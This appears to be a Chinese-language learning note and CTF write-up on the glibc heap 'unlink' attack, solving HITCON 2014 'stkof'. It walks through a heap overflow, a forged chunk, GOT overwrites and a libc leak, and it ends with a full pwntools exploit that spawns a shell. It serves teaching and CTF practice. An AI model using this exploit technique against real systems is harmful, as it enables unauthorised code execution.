# Linux unlink技术学习

原理： [Linux堆溢出漏洞利用之unlink - 阿里移动安全.mhtml](Linux堆溢出漏洞利用之unlink - 阿里移动安全.mhtml) 

## unlink攻击技术题目训练 2014-HITCON-stkof

使用checksec进行分析

![image-20220921140616439](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921140616439.png)

接着我们用ida进行反汇编

主函数

![image-20220921141814841](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921141814841.png)

这里根据我们输入的选项会执行不同的函数，从选择1开始到选项4分别执行的函数为

1、alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 head

![image-20220921143414217](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921143414217.png)

我们申请的第一个缓冲区的chunk指针存在globals[1]中

![image-20220921144843657](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921144843657.png)

2、fill：根据指定索引，向分配的内存处读入数据，数据长度可控，这里存在堆溢出的情况

![image-20220921141516086](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921141516086.png)

```
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
参数
    ptr -- 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针。
    size -- 这是要读取的每个元素的大小，以字节为单位。
    nmemb -- 这是元素的个数，每个元素的大小为 size 字节。
    stream -- 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流。
返回值
    成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型。如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾。
fread(ptr, 1uLL, size, stdin)
向ptr指针所指的地址读取size个字节的值，每次读1字节，读取成功后返回1
```

3、free_chunk：根据指定索引，释放已经分配的内存块

![image-20220921143804418](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921143804418.png)

4、print：输入一些信息

![image-20220921143811935](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921143811935.png)

-------------------------

我们的做题思路是通过unlink函数，修改free@plt为put@plt，想办法输出puts函数的真实地址，计算libcbase，从而得到system地址，修改atoi@got为system，通过的输入/bin/sh的地址，执行system('/bin/sh')获得shell

我们先弄一个正常交互的脚本

```python
# coding=utf-8
from pwn import *

link = 0
if link == 1:
    shell = remote("", )
else:
    shell = process("./stkof")
elf = ELF("./stkof")
libc = ELF("./libc.so.6")

def alloc(size):
    shell.sendline("1")
    shell.sendline(str(size))
    shell.recvuntil("OK\n")

def fill(idx, cont):
    shell.sendline("2")
    shell.sendline(str(idx))
    shell.sendline(str(len(cont)))
    shell.send(cont)
    shell.recvuntil("OK\n")

def free(idx):
    shell.sendline("3")
    shell.sendline(str(idx))
    shell.recvuntil("OK\n")
```

fill函数的没有对输入进行限制，但是读入的方法不是gets那种，他读到换行符不会结束，会把换行符也当作一种输入，然后继续等待接下来的输入，而sendline在末尾会有换行符，所以我们采用末尾不带有换行符而是相当于带有\x00的send。

首先我们申请内存

```python
alloc(0x100) #1
alloc(0x30)  #2
alloc(0x80)  #3
```

我们用gdb在0x400CB6处下个断点`b *0x400CB6`，开始执行选项1进行空间分配，分配完之后看到我们的指针的数组globals(0x602140)处，发现确实是从globals[1]开始记录我们分配的head

![image-20220921181932845](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921181932845.png)

这里我们的思路为分配3个空间，**在第二个空间溢出**，让**02 chunk and 03 chunk 合并**, unlink.

那我们就需要伪造chunk

```
unlink的验证则要求fd->bk == P && bk->fd == P
```

首先我们使用head变量记录globals的起始位置

```python
head = 0x602140 # 

#fake chunk
chunk_fd = head + 0x10 -0x18 #pass check
chunk_bk = head + 0x10 -0x10 #pass check

payload = p64(0)            #padding
payload += p64(0x31)        #size (chunk1 not affect,30 or 31 bath pass)
payload += p64(chunk_fd)    # chunk2 - 0x18
payload += p64(chunk_bk)    # chunk2 - 0x10
payload += p64(0)           #padding
payload += p64(0)           #padding

payload += p64(0x30)        #overwrite chunk3's prev_size
payload += p64(0x90)        #overwrite chunk3's size

fill(2, payload) #overwrite chunk3
# a = input() //sh: gdb -p 端口
free(3) #unlink
```

我们unlink之前globals指针数组中的情况

![image-20220922142102103](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922142102103.png)

再看看chunk2的位置，成功覆盖调了chunk3的**prev_size**和**size**里的**prev_inuse**标志位

![image-20220922142416774](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922142416774.png)

触发unlink之后，chunk3被free掉并置NULL，而chunk2的指针变成了head-0x8

![image-20220922142612983](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922142612983.png)

现在我们利用类似的方法free_got替换成puts_plt，首先需要把free_got和puts_got的地址放进去

```python
payload = p64(0)
payload += p64(elf.got['free'])
payload += p64(elf.got['puts'])
payload += p64(elf.got['atoi'])
fill(2,payload)
#gdb.attach(shell)
```

![image-20220922144712621](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922144712621.png)

```python
此时
globals[0] = elf.got['free']
globals[1] = elf.got['puts']
globals[2] = elf.got['atoi']
```

接下来我们把free_got替换成puts_plt

```python
payload = p64(elf.plt['puts'])
fill(0,payload)
```

之后我们再执行free(1)时，相当于puts(puts_got)，可以拿到puts的真实地址，又知道libc，可以通过偏移知道system

```python
free(1)     #put(puts@pot)
puts_addr = shell.recvuntil("\nOK\n",drop=True).ljust(8,'\x00')
puts_addr = u64(puts_addr)
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
```

接着我们将atoi_got替换成system就能获得shell

```
payload = p64(system_addr)
fill(2,payload)

shell.sendline('/bin/sh')
shell.interactive()
```

![image-20220922151247378](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922151247378.png)

完整exp

```python
# coding=utf-8
from pwn import *

link = 0
if link == 1:
    shell = remote("", )
else:
    shell = process("./stkof")
elf = ELF("./stkof")
libc = ELF("./libc.so.6")

def alloc(size):
    shell.sendline("1")
    shell.sendline(str(size))
    shell.recvuntil("OK\n")

def fill(idx, cont):
    shell.sendline("2")
    shell.sendline(str(idx))
    shell.sendline(str(len(cont)))
    shell.send(cont)
    shell.recvuntil("OK\n")

def free(idx):
    shell.sendline("3")
    shell.sendline(str(idx))

alloc(0x100) #1
alloc(0x30)  #2
alloc(0x80)  #3

head = 0x602140

#fake chunk
chunk_fd = head + 0x10 -0x18 #pass check
chunk_bk = head + 0x10 -0x10 #pass check

payload = p64(0)            #padding
payload += p64(0x31)        #size (chunk1 not affect,30 or 31 bath pass)
payload += p64(chunk_fd)    # chunk2 - 0x18
payload += p64(chunk_bk)    # chunk2 - 0x10
payload += p64(0)           #padding
payload += p64(0)           #padding

payload += p64(0x30)        #overwrite chunk3's prev_size
payload += p64(0x90)        #overwrite chunk3's size

fill(2, payload)            #overwrite chunk3
free(3)     #unlink globals[2] = &globals - 0x8
shell.recvuntil("OK")

payload = p64(0)
payload += p64(elf.got['free']) #globals[0]
payload += p64(elf.got['puts']) #globals[1]
payload += p64(elf.got['atoi']) #globals[2]
fill(2,payload)
payload = p64(elf.plt['puts'])
fill(0,payload)     #free@got = puts@plt

free(1)     #put(puts@pot)
puts_addr = shell.recvuntil("\nOK\n",drop=True).ljust(8,'\x00')
puts_addr = u64(puts_addr)
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']

print 'puts_addr = ' + hex(puts_addr)
print 'libcbase = ' + hex(libcbase)
print 'system = ' + hex(system_addr)

payload = p64(system_addr)
fill(2,payload)

shell.sendline('/bin/sh')
shell.interactive()
```

